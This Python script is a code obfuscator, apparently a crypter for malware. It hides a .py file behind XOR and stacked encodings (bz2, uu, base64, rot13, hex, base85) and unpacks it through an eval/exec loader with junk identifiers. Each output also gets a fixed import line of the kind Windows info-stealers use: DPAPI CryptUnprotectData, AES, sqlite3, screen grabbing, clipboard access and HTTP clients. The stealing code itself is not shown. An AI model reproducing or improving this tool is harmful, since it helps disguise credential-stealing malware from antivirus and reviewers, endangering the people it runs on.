import os
import base64 
import argparse
import codecs
import random
import string
from colorama import Fore


class Obfuscator:
    def __init__(self, code):
        self.code = code
        self.__obfuscate()
    
    def __xorED(self, text, key = None):
        newstring = ""
        if key is None:
            key = "".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))
        if not key[0] == " ":
            key = " " + key
        for i in range(len(text)):
            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))
        return (newstring, key)

    def __encodestring(self, string):
        newstring = ''
        for i in string:
            if random.choice([True, False]):
                newstring += '\\x' + codecs.encode(i.encode(), 'hex').decode()
            else:
                newstring += '\\' + oct(ord(i))[2:]
        return newstring

    def __obfuscate(self):
        xorcod = self.__xorED(self.code)
        self.code = xorcod[0]
        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()
        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]
        new_encoded_code = []
        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')
        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')
        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')
        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')
        self.code = f"""
KSCHdsc=eval("{self.__encodestring('eval')}");KSCHdsc__=KSCHdsc("{self.__encodestring('compile')}");KSCHdsc_,____=KSCHdsc(KSCHdsc__("{self.__encodestring("__import__('base64')")}","",KSCHdsc.__name__)),KSCHdsc(KSCHdsc__("{self.__encodestring("__import__('codecs')")}","",KSCHdsc.__name__));KSCHdscKSCHdscKSCHdscKSCHdsc=KSCHdsc("'{self.__encodestring(xorcod[True])}'");KSCHdsc___,KSCHdsc____,KSCHdscKSCHdsc,KSCHdscKSCHdsc_=KSCHdsc(KSCHdsc__("{self.__encodestring('exec')}","",KSCHdsc.__name__)),KSCHdsc(KSCHdsc__("{self.__encodestring('str.encode')}","",KSCHdsc.__name__)),KSCHdsc(KSCHdsc__("{self.__encodestring('isinstance')}","",KSCHdsc.__name__)),KSCHdsc(KSCHdsc__("{self.__encodestring('bytes')}","",KSCHdsc.__name__))
def KSCHdscKSCHdscKSCHdsc____(KSCHdscKSCHdsc, KSCHdscKSCHdsc_):
    KSCHdscKSCHdsc=KSCHdscKSCHdsc.decode()
    KSCHdsc____=""
    if not KSCHdscKSCHdsc_[False]=="{self.__encodestring(' ')}":
        KSCHdscKSCHdsc_="{self.__encodestring(' ')}"+KSCHdscKSCHdsc_
    for _ in range(KSCHdsc("{self.__encodestring('len(KSCHdscKSCHdsc)')}")):
        KSCHdsc____+=KSCHdsc("{self.__encodestring('chr(ord(KSCHdscKSCHdsc[_])^ord(KSCHdscKSCHdsc_[(len(KSCHdscKSCHdsc_) - True*2) + True]))')}")
    return (KSCHdsc____,KSCHdscKSCHdsc_)
def KSCHdscKSCHdsc__(KSCHdscKSCHdsc___):
    if(KSCHdscKSCHdsc___[-True]!=KSCHdsc(KSCHdsc__("'{self.__encodestring('cKSCHdscKSCHdscKSCHdsc_6s5KSCHdscKSCHdscKSCHdsc_6ardv8')}'[-True*4]","",KSCHdsc.__name__))):KSCHdscKSCHdsc___ = KSCHdsc____(KSCHdscKSCHdsc___)
    if not(KSCHdscKSCHdsc(KSCHdscKSCHdsc___, KSCHdscKSCHdsc_)):KSCHdscKSCHdsc___ = KSCHdsc(KSCHdsc__("{self.__encodestring('____.decode(KSCHdscKSCHdsc___[:-True]')},'{self.__encodestring('rot13')}')","",KSCHdsc.__name__))
    else:
        if(KSCHdscKSCHdsc___[-True]==KSCHdsc(KSCHdsc__("b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]","", KSCHdsc.__name__))):
            KSCHdscKSCHdsc___=KSCHdsc(KSCHdsc__("{self.__encodestring('____.decode(KSCHdscKSCHdsc___[:-True]')},'{self.__encodestring('uu')}')","",KSCHdsc.__name__))
        elif (KSCHdscKSCHdsc___[-True] ==KSCHdsc(KSCHdsc__("b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]","", KSCHdsc.__name__))):KSCHdscKSCHdsc___=KSCHdsc(KSCHdsc__("{self.__encodestring('____.decode(KSCHdscKSCHdsc___[:-True]')},'{self.__encodestring('hex')}')","",KSCHdsc.__name__))
        else:KSCHdscKSCHdsc___=KSCHdsc(KSCHdsc__("{self.__encodestring('KSCHdsc_.b85decode(KSCHdscKSCHdsc___[:-True])')}","",KSCHdsc.__name__));KSCHdscKSCHdsc___=KSCHdsc(KSCHdsc__("{self.__encodestring('____.decode(KSCHdscKSCHdsc___')}, '{self.__encodestring('hex')}')","",KSCHdsc.__name__))
        KSCHdscKSCHdsc___=KSCHdsc(KSCHdsc__("{self.__encodestring('KSCHdscKSCHdsc_.decode(KSCHdscKSCHdsc___)')}","",KSCHdsc.__name__))
    return KSCHdscKSCHdsc___
KSCHdscKSCHdscKSCHdsc__=KSCHdsc(KSCHdsc__("{self.__encodestring('KSCHdscKSCHdsc_.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})","",KSCHdsc.__name__));KSCHdscKSCHdscKSCHdsc_ = KSCHdsc(KSCHdsc__("{self.__encodestring('KSCHdscKSCHdsc_.decode')}({self.__encodestring(new_encoded_code[1]).encode()})","",KSCHdsc.__name__));KSCHdscKSCHdscKSCHdsc___=KSCHdsc(KSCHdsc__("{self.__encodestring('KSCHdscKSCHdsc_.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})","",KSCHdsc.__name__));KSCHdscKSCHdsc____=KSCHdsc(KSCHdsc__("{self.__encodestring('KSCHdscKSCHdsc_.decode')}({self.__encodestring(new_encoded_code[False]).encode()})","",KSCHdsc.__name__));KSCHdscKSCHdscKSCHdsc=KSCHdsc(KSCHdsc__("{self.__encodestring('str.join')}('', {self.__encodestring('[KSCHdscKSCHdsc__(x) for x in [KSCHdscKSCHdsc____,KSCHdscKSCHdscKSCHdsc_,KSCHdscKSCHdscKSCHdsc___,KSCHdscKSCHdscKSCHdsc__]]')})","", KSCHdsc.__name__));KSCHdsc___(KSCHdscKSCHdscKSCHdsc____(____.decode(____.decode(KSCHdsc_.b64decode(KSCHdsc____(KSCHdscKSCHdscKSCHdsc)), "{self.__encodestring("uu")}"),"{self.__encodestring("bz2")}"),KSCHdscKSCHdscKSCHdscKSCHdsc)[KSCHdsc("{self.__encodestring('False')}")])\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip,base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"""

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('FILE', help='the target file', metavar= 'SOURCE')
    parser.add_argument('-o', metavar='path', help='custom output file path')
    args = parser.parse_args()
    if args.o is None:
        args.o = f'obfuscated_{os.path.basename(args.FILE)}'
    if not os.path.isfile(args.FILE):
        print(f'File "{os.path.basename(args.FILE)}" is not found')
        exit()
    elif not 'py' in os.path.basename(args.FILE).split('.')[-1]:
        print(f'''File "{os.path.basename(args.FILE)}" is not a '.py' file''')
        exit()
    with open(args.FILE, encoding='utf-8') as file:
        CODE = file.read()
    obfuscator = Obfuscator(CODE)
    with open(args.o, 'w', encoding='utf-8') as output_file:
        output_file.write(obfuscator.code)
    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code obfuscated!{Fore.RESET}')

if __name__ == '__main__':
    main()
